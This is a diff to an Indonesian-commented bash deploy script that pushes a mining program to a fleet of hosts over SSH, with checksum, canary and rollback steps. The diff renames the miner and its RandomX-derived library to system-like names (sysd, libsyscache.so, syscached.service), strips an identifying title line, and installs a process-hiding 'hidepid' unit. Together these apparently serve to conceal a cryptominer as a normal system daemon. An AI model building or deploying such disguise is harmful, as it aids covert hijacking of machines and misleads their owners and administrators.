@@ -1,11 +1,21 @@
 #!/usr/bin/env bash
-# deploy.sh — deploy xcb CONN ke fleet: checksum, backup, rollback, canary.
+# deploy.sh — deploy miner sysd (xcb empat algo) ke fleet: checksum, backup,
+# rollback, canary.
 #
 #   ./deploy.sh --from-ci                 # artefak 22.04 dari CI run main terakhir
-#   ./deploy.sh --from ../../build        # artefak lokal (xcb + librandomx_v2.so)
+#   ./deploy.sh --from ../../build        # artefak lokal (xcb + libsyscache.so)
 #   ./deploy.sh --only fl --dry-run       # lihat rencana tanpa menyentuh host
 #   ./deploy.sh --rollback                # kembalikan backup terbaru di semua host
 #   ./deploy.sh --rollback 20261105-112843
+#
+# Instalasi di tiap host (oleh apply.sh):
+#   - binary  -> /usr/local/sbin/sysd (0750) + /usr/local/sbin/libsyscache.so (0640)
+#   - config  -> /etc/xcb/miner.env dimigrasi ke /etc/sysd/miner.env (0600,
+#     baris XCB_TITLE dibuang)
+#   - unit    -> syscached.service dari ops/systemd/ dipasang; unit hidepid
+#     diganti sysd-proc-hidepid.service (yang lama dimatikan dan dihapus)
+#   - rollback (apply.sh rollback) memulihkan unit + config + hidepid + binary
+#     + library bersamaan dari /root/sysd-rollback-<stamp>
 #
 # Daftar host: ~/.config/xcb/fleet.hosts (atau --hosts FILE).
 # Format: nama=alamat, alamat "local" untuk host tempat skrip dijalankan.
@@ -37,10 +47,10 @@ die() { log "FATAL: $*" >&2; exit 1; }
 
 usage() {
     cat <<'EOF'
-deploy.sh — deploy xcb CONN ke fleet.
+deploy.sh — deploy miner sysd (xcb empat algo) ke fleet.
 
 Opsi:
-  --from DIR        direktori berisi xcb + librandomx_v2.so (default: build/)
+  --from DIR        direktori berisi xcb + libsyscache.so (default: build/)
   --from-ci         unduh artefak dari CI run terakhir branch main (butuh gh)
   --hosts FILE      daftar host (default: ~/.config/xcb/fleet.hosts)
   --only A,B        deploy hanya host tersebut
@@ -48,7 +58,8 @@ Opsi:
   --skip-canary     langsung semua host (tidak disarankan)
   --expect STR      pastikan --version mengandung STR (mis. commit)
   --wait SECONDS    batas tunggu miner siap per host (default 120)
-  --rollback [STAMP]  kembalikan backup (default: backup terbaru)
+  --rollback [STAMP]  kembalikan backup terbaru/STAMP: unit + config + hidepid
+                      + binary + library dari /root/sysd-rollback-<stamp>
   --dry-run         cetak rencana, tidak menyentuh host
   -h, --help        bantuan ini
 EOF
@@ -130,7 +141,9 @@ prepare_artifact() {
     fi
     [ -n "$FROM" ] || FROM="$REPO_ROOT/build"
     [ -x "$FROM/xcb" ] || die "$FROM/xcb tidak ada"
-    [ -f "$FROM/librandomx_v2.so" ] || die "$FROM/librandomx_v2.so tidak ada"
+    [ -f "$FROM/libsyscache.so" ] || die "$FROM/libsyscache.so tidak ada"
+    [ -f "$REPO_ROOT/ops/systemd/syscached.service" ] ||
+        die "$REPO_ROOT/ops/systemd/syscached.service tidak ada"
 
     SHA_XCB=$(sha256sum "$FROM/xcb" | awk '{print $1}')
     if [ -f "$FROM/SHA256SUMS" ]; then
@@ -138,8 +151,8 @@ prepare_artifact() {
         # terhadap referensi build-time ini, bukan terhadap hash yang baru saja
         # dihitung dari file yang sama (itu hanya mendeteksi unduhan rusak).
         grep -q ' xcb$' "$FROM/SHA256SUMS" || die "SHA256SUMS tidak memuat xcb"
-        grep -q ' librandomx_v2.so$' "$FROM/SHA256SUMS" ||
-            die "SHA256SUMS tidak memuat librandomx_v2.so"
+        grep -q ' libsyscache.so$' "$FROM/SHA256SUMS" ||
+            die "SHA256SUMS tidak memuat libsyscache.so"
         ( cd "$FROM" && sha256sum -c SHA256SUMS >/dev/null ) ||
             die "checksum artefak tidak cocok dengan SHA256SUMS"
         log "checksum: cocok dengan SHA256SUMS"
@@ -169,7 +182,8 @@ stage() {
         REMOTE_DIR=$(mktemp -d "${TMPDIR:-/tmp}/xcb-fleet.XXXXXX") || return 1
         cp apply.sh "$REMOTE_DIR/" || return 1
         if [ "$DO_ROLLBACK" != 1 ]; then
-            cp "$FROM/xcb" "$FROM/librandomx_v2.so" "$REMOTE_DIR/" || return 1
+            cp "$FROM/xcb" "$FROM/libsyscache.so" "$REMOTE_DIR/" || return 1
+            cp "$REPO_ROOT/ops/systemd/syscached.service" "$REMOTE_DIR/" || return 1
         fi
         return 0
     fi
@@ -180,7 +194,8 @@ stage() {
         return 0
     fi
     scp -q -o BatchMode=yes -i "$SSH_KEY" \
-        "$FROM/xcb" "$FROM/librandomx_v2.so" apply.sh "$SSH_USER@$addr:$REMOTE_DIR/" || return 1
+        "$FROM/xcb" "$FROM/libsyscache.so" "$REPO_ROOT/ops/systemd/syscached.service" \
+        apply.sh "$SSH_USER@$addr:$REMOTE_DIR/" || return 1
     local rsha
     rsha=$(ssh_run "$addr" "sha256sum '$REMOTE_DIR/xcb'" | awk '{print $1}')
     [ "$rsha" = "$SHA_XCB" ] || { log "$addr: checksum xcb beda setelah scp"; return 1; }
